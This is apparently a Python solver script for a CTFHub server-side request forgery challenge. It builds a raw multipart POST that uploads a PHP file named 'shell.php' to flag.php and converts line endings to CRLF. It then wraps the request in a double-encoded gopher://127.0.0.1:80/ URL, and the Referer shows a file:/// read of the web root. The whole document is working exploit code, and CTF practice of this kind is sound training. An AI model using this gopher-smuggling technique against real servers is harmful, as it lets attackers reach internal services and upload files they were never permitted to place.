import urllib.parse
payload =\
"""
POST http://challenge-81a992acafb594a1.sandbox.ctfhub.com:10800/flag.php HTTP/1.1
Host: challenge-81a992acafb594a1.sandbox.ctfhub.com:10800
Content-Length: 297
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://challenge-81a992acafb594a1.sandbox.ctfhub.com:10800
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysHApKS9mkfGKfQob
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-81a992acafb594a1.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7
Connection: close

------WebKitFormBoundarysHApKS9mkfGKfQob
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: text/php

<?php phpinfo(); ?>
------WebKitFormBoundarysHApKS9mkfGKfQob
Content-Disposition: form-data; name="file"

提交
------WebKitFormBoundarysHApKS9mkfGKfQob--


"""

tmp = urllib.parse.quote(payload)
print(tmp)
# 在 HTTP 协议中，头部字段是以 \r\n 作为分隔的
new = tmp.replace('%0A','%0D%0A')
print(new)
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)
print(result)      